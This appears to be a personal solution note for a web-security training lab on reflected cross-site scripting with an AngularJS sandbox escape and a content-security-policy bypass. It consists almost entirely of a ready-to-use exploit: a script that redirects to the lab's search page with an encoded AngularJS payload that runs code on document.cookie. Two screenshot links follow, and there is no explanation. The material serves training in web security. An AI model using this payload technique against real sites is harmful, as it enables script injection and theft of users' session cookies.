# EXPERT: Reflected XSS with AngularJS sandbox escape and CSP

```jsx
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

![Снимок экрана 2025-12-01 в 10.44.34.png](EXPERT%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%202bc0-de6c/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_10.44.34.png)

![Снимок экрана 2025-12-01 в 10.44.54.png](EXPERT%20Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%202bc0-de6c/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_10.44.54.png)